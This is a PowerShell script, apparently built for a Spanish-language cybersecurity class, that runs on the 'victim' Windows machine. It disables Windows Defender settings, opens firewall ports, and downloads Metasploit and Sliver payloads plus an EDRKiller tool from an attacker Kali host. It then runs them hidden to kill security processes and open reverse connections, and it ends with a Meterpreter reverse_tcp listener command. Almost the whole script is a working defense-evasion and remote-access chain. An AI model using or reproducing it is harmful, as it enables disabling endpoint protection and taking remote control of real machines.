#Requires -RunAsAdministrator
<#
.SYNOPSIS
    MEGA COMBO - LADO VICTIMA (Windows Bokul)
    EDRKILLER + Sliver + TheFatRat + Metasploit
.DESCRIPTION
    Script todo-en-uno para la maquina Windows.
    Desactiva defensas, ejecuta EDRKiller, corre payloads MSF y Sliver.
    
    EJECUTAR: PowerShell -ExecutionPolicy Bypass -File MEGA-COMBO-WINDOWS.ps1
    
    Laboratorio Ciberseguridad - Profesor
.NOTES
    Kali Itmar: 192.168.163.129
    Windows Bokul: 192.168.163.130
#>

param(
    [string]$KaliIP = "192.168.163.129",
    [int]$PortMSF = 4444,
    [int]$PortSliver = 8443
)

$ErrorActionPreference = "SilentlyContinue"
$LOG = "$env:TEMP\mega-combo-windows.log"
$CAPTURAS = "C:\capturas-mega"
$PAYLOAD_DIR = "C:\payloads_mega"

mkdir $CAPTURAS -Force -EA 0 | Out-Null
mkdir $PAYLOAD_DIR -Force -EA 0 | Out-Null

function Log   { param($M) "$(Get-Date -Format 'HH:mm:ss') | $M" | Out-File $LOG -Append }
function INFO  { param($M) Write-Host "[*] $M" -ForegroundColor Gray; Log $M }
function OK    { param($M) Write-Host "[✓] $M" -ForegroundColor Green; Log "[OK] $M" }
function WARN  { param($M) Write-Host "[!] $M" -ForegroundColor Yellow; Log "[WARN] $M" }
function DONE  { param($M) Write-Host "[✔] $M" -ForegroundColor Cyan; Log $M }
function CAP   { param($N,$M) Write-Host "`n[📸 CAPTURA $N] $M" -ForegroundColor Magenta }
function HEADER{ param($M) Write-Host "`n$('='*65)" -ForegroundColor Cyan; Write-Host "  $M" -ForegroundColor Cyan; Write-Host "$('='*65)" -ForegroundColor Cyan }
function PAUSA { Write-Host "`nPresiona ENTER para continuar..." -ForegroundColor Yellow; Read-Host | Out-Null }

Clear-Host
Write-Host @"

╔═══════════════════════════════════════════════════════════════╗
║  MEGA COMBO WINDOWS - EDRKILLER + SLIVER + METASPLOIT        ║
║  Laboratorio Ciberseguridad - Modo Profesor                  ║
╚═══════════════════════════════════════════════════════════════╝

  Kali Itmar:      $KaliIP
  Tu IP:           192.168.163.130
  Puerto MSF:      $PortMSF
  Puerto Sliver:   $PortSliver
  Payloads en:     $PAYLOAD_DIR
  Capturas en:     $CAPTURAS
  Log:             $LOG

"@

Write-Host "Presiona ENTER para iniciar el laboratorio..." -ForegroundColor Green
PAUSA

# =============================================================
# FASE 1: VERIFICACION INICIAL
# =============================================================
HEADER "FASE 1/7: VERIFICACION DE RED"

CAP 1 "IP de Windows"
ipconfig | findstr IPv4
PAUSA

CAP 2 "Ping a Kali Itmar ($KaliIP)"
ping -n 2 $KaliIP
if ($LASTEXITCODE -eq 0) {
    OK "Conexion con Kali establecida"
} else {
    WARN "Kali NO responde - revisar conexion de red"
}
PAUSA

# =============================================================
# FASE 2: DESACTIVAR DEFENSAS
# =============================================================
HEADER "FASE 2/7: DESACTIVANDO DEFENSAS"

INFO "Desactivando Windows Defender..."
CAP 3 "Estado de Defender ANTES"
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableBlockAtFirstSeen

try {
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableBehaviorMonitoring $true
    Set-MpPreference -DisableBlockAtFirstSeen $true
    Set-MpPreference -DisableIOAVProtection $true
    Set-MpPreference -DisableIntrusionPreventionSystem $true
    Set-MpPreference -DisableScriptScanning $true
    Set-MpPreference -SubmitSamplesConsent 2
    Add-MpPreference -ExclusionPath "$PAYLOAD_DIR" -EA 0
    OK "Defender desactivado"
} catch {
    WARN "No se pudo desactivar Defender - Tamper Protection activo?"
    WARN "Abrir: Seguridad de Windows -> Virus -> Administrar config -> Apagar Tamper Protection"
    PAUSA
}

CAP 4 "Estado de Defender DESPUES"
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableBlockAtFirstSeen
PAUSA

# =============================================================
# FASE 3: FIREWALL
# =============================================================
HEADER "FASE 3/7: CONFIGURANDO FIREWALL"

try {
    Remove-NetFirewallRule -DisplayName "LAB-Mega-*" -EA 0
    New-NetFirewallRule -DisplayName "LAB-Mega-In" -Direction Inbound -Protocol TCP -LocalPort $PortMSF,$PortSliver -Action Allow -EA 0
    New-NetFirewallRule -DisplayName "LAB-Mega-Out" -Direction Outbound -Protocol TCP -LocalPort $PortMSF,$PortSliver -Action Allow -EA 0
    OK "Firewall configurado (puertos $PortMSF y $PortSliver abiertos)"
} catch {
    WARN "No se pudo configurar firewall - $_"
}

CAP 5 "Reglas de firewall"
Get-NetFirewallRule -DisplayName "LAB-Mega-*" | Format-Table DisplayName, Direction, Enabled, Action -AutoSize
PAUSA

# =============================================================
# FASE 4: DESCARGAR PAYLOADS
# =============================================================
HEADER "FASE 4/7: DESCARGANDO PAYLOADS DESDE KALI"

$archivos = @(
    "payload_msf.exe",
    "sliver_implant.exe",
    "EDRKiller.exe",
    "ejecutar.ps1"
)

foreach ($archivo in $archivos) {
    $url = "http://$KaliIP`:8000/$archivo"
    $destino = "$PAYLOAD_DIR\$archivo"
    
    INFO "Descargando: $archivo"
    try {
        Invoke-WebRequest -Uri $url -OutFile $destino -UseBasicParsing -ErrorAction Stop
        $tamano = (Get-Item $destino).Length
        OK "$archivo descargado ($([math]::Round($tamano/1KB,1)) KB)"
    } catch {
        WARN "$archivo NO descargado - $_"
        WARN "URL: $url"
    }
}

CAP 6 "Archivos descargados"
Get-ChildItem $PAYLOAD_DIR | Select-Object Name, Length, LastWriteTime | Format-Table -AutoSize
PAUSA

# =============================================================
# FASE 5: EJECUTAR EDRKILLER
# =============================================================
HEADER "FASE 5/7: EJECUTANDO EDRKILLER"

CAP 7 "Antes de EDRKiller - procesos activos"
Get-Process -Name "MsMpEng","Sense","Crowdstrike","Sentinel" -EA 0 | Format-Table Name, Id, CPU -AutoSize

if (Test-Path "$PAYLOAD_DIR\EDRKiller.exe") {
    INFO "Ejecutando EDRKiller.exe..."
    Start-Process -FilePath "$PAYLOAD_DIR\EDRKiller.exe" -ArgumentList "-force -silent" -Wait -WindowStyle Hidden -NoNewWindow
    Start-Sleep -Seconds 2
    OK "EDRKiller ejecutado"
} else {
    WARN "EDRKiller.exe no encontrado - continuando sin el"
}

CAP 8 "Despues de EDRKiller - defensas caidas"
Get-Process -Name "MsMpEng","Sense","Crowdstrike","Sentinel" -EA 0 | Format-Table Name, Id, CPU -AutoSize
if (-not (Get-Process -Name "MsMpEng" -EA 0)) {
    OK "Windows Defender neutralizado por EDRKiller"
} else {
    WARN "Defender sigue activo - EDRKiller no funciono completamente"
}
PAUSA

# =============================================================
# FASE 6: EJECUTAR PAYLOADS
# =============================================================
HEADER "FASE 6/7: EJECUTANDO PAYLOADS"

# 6.1 Payload Metasploit
if (Test-Path "$PAYLOAD_DIR\payload_msf.exe") {
    INFO "Ejecutando payload Metasploit (conectando a $KaliIP`:$PortMSF)..."
    Start-Process -FilePath "$PAYLOAD_DIR\payload_msf.exe" -WindowStyle Hidden
    OK "Payload MSF ejecutado"
} else {
    WARN "payload_msf.exe no encontrado"
}

Start-Sleep -Seconds 1

# 6.2 Implant Sliver
if (Test-Path "$PAYLOAD_DIR\sliver_implant.exe") {
    INFO "Ejecutando implant Sliver (conectando a $KaliIP`:$PortSliver)..."
    Start-Process -FilePath "$PAYLOAD_DIR\sliver_implant.exe" -WindowStyle Hidden
    OK "Implant Sliver ejecutado"
} else {
    WARN "sliver_implant.exe no encontrado"
}

Start-Sleep -Seconds 3

CAP 9 "Conexiones activas hacia Kali"
netstat -an | findstr "$KaliIP"
PAUSA

# =============================================================
# FASE 7: VERIFICACION FINAL
# =============================================================
HEADER "FASE 7/7: VERIFICACION FINAL"

CAP 10 "Procesos de payloads corriendo"
Get-Process -Name "payload*","sliver*","EDRKiller","powershell" -EA 0 | Select-Object Name, Id, StartTime | Format-Table -AutoSize

CAP 11 "Puertos abiertos (conexiones establecidas)"
netstat -an | Select-String "ESTABLISHED" | Select-String "$KaliIP|4444|8443"

CAP 12 "Resumen final de capturas"
Write-Host @"

╔═══════════════════════════════════════════════════════════════╗
║  ✅ WINDOWS BOKUL - LABORATORIO COMPLETADO                   ║
╚═══════════════════════════════════════════════════════════════╝

📸 CAPTURAS REALIZADAS (12):
  1.  IP de Windows Bokul
  2.  Ping a Kali
  3.  Defender ANTES (activo)
  4.  Defender DESPUES (desactivado)
  5.  Reglas de firewall
  6.  Archivos descargados desde Kali
  7.  Procesos antes de EDRKiller
  8.  Procesos despues de EDRKiller
  9.  Conexiones activas hacia Kali
  10. Procesos de payloads
  11. Puertos establecidos (netstat)
  12. Este resumen

🔗 CONEXIONES ACTIVAS:
  - Metasploit: $KaliIP`:$PortMSF
  - Sliver C2:  $KaliIP`:$PortSliver
  - Descarga:   http://$KaliIP:8000/

🔄 AHORA EN KALI ITMAR (terminal del listener):
  msfconsole -q -x 'use multi/handler;
  set PAYLOAD windows/meterpreter/reverse_tcp;
  set LHOST 0.0.0.0; set LPORT 4444;
  set ExitOnSession false; exploit -j -z'

  Luego: sessions -i 1 → sysinfo → getuid → screenshot

📂 CAPTURAS GUARDADAS EN: $CAPTURAS
📄 LOG: $LOG

"@

OK "Laboratorio completado exitosamente"
PAUSA
